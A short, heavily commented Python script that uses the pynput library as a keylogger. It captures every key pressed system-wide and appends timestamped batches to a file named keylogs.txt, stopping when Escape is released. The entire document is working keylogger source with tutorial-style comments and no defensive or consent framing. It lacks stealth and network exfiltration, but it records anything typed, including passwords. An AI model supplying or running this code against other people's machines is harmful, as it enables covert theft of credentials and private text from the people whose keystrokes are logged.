# - pynput.keyboard (Key, Listener): Used for monitoring keyboard events (key press and release).
import logging
from datetime import datetime
from pynput.keyboard import Key, Listener

# Global variable to accumulate keys until a delimiter (space) is pressed.
keys = []

def on_press(key):
    """
    Callback function invoked each time a key is pressed.
    
    This function appends the pressed key to the global 'keys' list,
    prints the key for debugging purposes, and checks if the space key
    was pressed. If the space key is detected, it triggers the logging of
    the accumulated keystrokes into a file, and then clears the list.
    """
    global keys  # Reference the global variable 'keys'
    
    # Append the pressed key to the list.
    keys.append(key)
    
    # Print the pressed key to the console for debugging.
    print(f"{key} pressed")
    
    # Check if the pressed key is the space key.
    # Using Key.space from pynput to detect space.
    if key == Key.space:
        # Write all collected keys to the file in one batch.
        write_file(keys)
        # Clear the keys list after writing to prepare for a fresh batch of keystrokes.
        keys.clear()

def write_file(key_list):
    
    #Writes a list of captured keystrokes to the file 'keylogs.txt' with a timestamp.
    # Get the current timestamp in the format "Year-Month-Day Hour:Minute:Second".
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Open the file 'keylogs.txt' in append mode ('a'). 
    # This ensures that new data is added to the end of the file.
    with open("keylogs.txt", "a") as f:
        # Write the timestamp at the beginning of the line.
        f.write(f"{timestamp} - ")
        
        # Loop through each key in the batch.
        for k in key_list:
            # Convert the key to a string and remove any surrounding single quotes.
            k_str = str(k).replace("'", "")
            
            # Only write keys that are not marked as special keys.
            # For example, we ignore keys like Key.space or Key.shift here.
            if "Key" not in k_str:
                f.write(k_str)
        # End the batch with a newline to separate it from the next batch.
        f.write("\n")

def on_release(key):
    """
    Callback function invoked each time a key is released.
    It checks if the released key is the Escape key (Key.esc).
    If so, returning False stops the key listener.
    """
    # If the Escape key is released, stop the listener.
    if key == Key.esc:
        return False

# Set up the Listener to monitor key press and release events.
# The Listener is provided with the on_press and on_release callback functions.
# Using 'with' ensures that the Listener is properly started and then joined (waiting)
# until it is stopped (in this case, when the user presses the Escape key).
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Start listening for events until on_release returns False.
